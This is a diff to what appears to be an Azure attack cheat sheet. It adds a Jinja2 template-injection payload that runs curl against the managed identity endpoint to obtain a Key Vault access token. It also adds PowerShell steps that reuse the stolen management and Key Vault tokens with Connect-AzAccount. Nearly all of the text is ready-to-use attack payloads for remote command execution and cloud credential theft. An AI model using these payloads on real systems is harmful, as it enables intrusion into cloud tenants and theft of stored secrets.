@@ -491,11 +491,25 @@ Now Let's request the access token for the managed identity now using the follow
 ```
 {{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
 ```
+- IF THERE IS A RESOURCE LIKE KEYVAULT:
+```
+{{config.__class__.__init__.__globals__['os'].popen('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER').read()}}
+```
 
 Now we can reuse the token:
 
 ```
 Connect-AzAccount -AccessToken $Token -AccountId <IDENTITY_HEADER>
+```
+
+And if there is also a keyvault:
+```
+PS C:\AzAD\Tools> $Token = 'eyJ0..'
+PS C:\AzAD\Tools> $keyvaulttoken = 'eyJ0..'
+```
+
+```
+Connect-AzAccount -AccessToken $Token -AccountId <IDENTITY_HEADER> -KeyVaultAccessToken $keyvaulttoken
 ```
 
 * * * 
